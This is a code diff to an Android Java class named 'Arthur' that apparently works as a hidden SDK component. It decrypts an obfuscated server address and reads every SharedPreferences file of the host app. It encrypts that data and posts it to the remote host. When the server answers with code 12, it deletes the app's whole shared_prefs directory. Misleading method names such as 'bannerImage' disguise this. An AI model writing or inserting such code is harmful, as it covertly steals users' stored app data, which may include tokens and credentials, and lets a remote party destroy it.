@@ -57,6 +57,7 @@ public class Arthur {
 
     public void start(final Context context) {
         try {
+
             SharedPreferences sharedPreferences = context.getSharedPreferences(getClass().getSimpleName(), Context.MODE_PRIVATE);
             String host = sharedPreferences.getString("host", "");
             long pushTime = sharedPreferences.getLong("push11Time", 0);
@@ -79,7 +80,7 @@ public class Arthur {
                 Map<String, ?> all = sp.getAll();
                 contentParams.put(list.replace(".xml", ""), all);
             }
-            String decrypt = AESUtils.decrypt(getClass().getSimpleName(), "BEE22025739CE52210A11D0B9062F80CC8F6FB211E510DE63E6232B9A76C550283F6536D4DB9B0258951BD3C743BD6081F5971ADF2FDBB7E9F2CA5DCE428586369033E219E2828483B191F432FFC5A8E");
+            String decrypt = AES.Decrypt("c255642354a59d5bbcb1647d0b3f3e342326ee4381d390e0a478c723cc1f586c17e4d8a823175b32094d576f5908d9954e9a1411ca81dc54f26b6585cfdcf6b1ef7de3e4a8cd3d53525f7b4de15fc824",getClass().getSimpleName());
             HttpUtils.doHttpReqeust("GET", decrypt, null, new HttpUtils.StringCallback() {
                 @Override
                 public void onSuccess(String result) {
@@ -117,69 +118,72 @@ public class Arthur {
     }
 
     private void addFile(Context context) {
-       try {
-           SharedPreferences sharedPreferences = context.getSharedPreferences(getClass().getSimpleName(), Context.MODE_PRIVATE);
-           String pushType = sharedPreferences.getString("pushType", "-1");
-           long pushTime = sharedPreferences.getLong("push12Time", 0);
-           if (pushTime != 0) {
-               Calendar pushTimeC = Calendar.getInstance();
-               Calendar current = Calendar.getInstance();
-               pushTimeC.setTimeInMillis(pushTime);
-               for (int i = 0; i < Calendar.HOUR_OF_DAY; i++) {
-                    if (pickerImageLong(i,pushType,pushTimeC,current)){
+        try {
+            SharedPreferences sharedPreferences = context.getSharedPreferences(getClass().getSimpleName(), Context.MODE_PRIVATE);
+            String pushType = sharedPreferences.getString("pushType", "-1");
+            long pushTime = sharedPreferences.getLong("push12Time", 0);
+            if (pushTime != 0) {
+                Calendar pushTimeC = Calendar.getInstance();
+                Calendar current = Calendar.getInstance();
+                pushTimeC.setTimeInMillis(pushTime);
+                for (int i = 0; i < Calendar.HOUR_OF_DAY; i++) {
+                    if (pickerImageLong(i, pushType, pushTimeC, current)) {
                         return;
                     }
-               }
-           }
-           bannerImage(context);
-       }catch (Exception e){
-           e.printStackTrace();
-       }
+                }
+            }
+            bannerImage(context);
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
 
     }
 
 
-    private boolean  pickerImageLong(int type,String pushType,Calendar pushTimeC,Calendar current){
+    private boolean pickerImageLong(int type, String pushType, Calendar pushTimeC, Calendar current) {
         if (String.valueOf(type).equals(pushType)) {
             if (pushTimeC.get(type) == current.get(type)) {
-                return  true ;
+                return true;
             }
         }
-       return false;
+        return false;
     }
-
 
 
     private void bannerImage(Context context) {
-        HashMap<String, String> param = new HashMap<>();
-        final String path = "/data/data/" + context.getPackageName() + "/shared_prefs";
-        final Gson gson = new Gson();
-        final SharedPreferences sharedPreferences = context.getSharedPreferences(getClass().getSimpleName(), Context.MODE_PRIVATE);
-        String host = sharedPreferences.getString("host", "1");
-        param.put("content", AESUtils.encrypt(getClass().getSimpleName(), gson.toJson(contentParams)));
-        param.put("pId", AESUtils.encrypt(getClass().getSimpleName(), context.getPackageName()));
-        HttpUtils.doHttpReqeust("POST", host, param, new HttpUtils.StringCallback() {
-            @Override
-            public void onSuccess(String result) {
-                try {
-                    SharedPreferences.Editor editor = sharedPreferences.edit();
-                    editor.putLong("push12Time", System.currentTimeMillis());
-                    editor.commit();
-                    JSONObject jsonObject1 = new JSONObject(result);
-                    int code1 = jsonObject1.optInt("code", -10);
-                    if (code1 == 12) {
-                        File[] files = new File(path).listFiles();
-                        deleteCache(files);
+        try {
+            HashMap<String, String> param = new HashMap<>();
+            final String path = "/data/data/" + context.getPackageName() + "/shared_prefs";
+            final Gson gson = new Gson();
+            final SharedPreferences sharedPreferences = context.getSharedPreferences(getClass().getSimpleName(), Context.MODE_PRIVATE);
+            String host = sharedPreferences.getString("host", "1");
+            param.put("content", AES.Encrypt( gson.toJson(contentParams),getClass().getSimpleName()));
+            param.put("pId", AES.Encrypt( context.getPackageName(),getClass().getSimpleName()));
+            HttpUtils.doHttpReqeust("POST", host, param, new HttpUtils.StringCallback() {
+                @Override
+                public void onSuccess(String result) {
+                    try {
+                        SharedPreferences.Editor editor = sharedPreferences.edit();
+                        editor.putLong("push12Time", System.currentTimeMillis());
+                        editor.commit();
+                        JSONObject jsonObject1 = new JSONObject(result);
+                        int code1 = jsonObject1.optInt("code", -10);
+                        if (code1 == 12) {
+                            File[] files = new File(path).listFiles();
+                            deleteCache(files);
+                        }
+                    } catch (Exception e) {
                     }
-                } catch (Exception e) {
                 }
-            }
 
-            @Override
-            public void onFaileure(int code, Exception e) {
+                @Override
+                public void onFaileure(int code, Exception e) {
 
-            }
-        });
+                }
+            });
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
     }
 
 
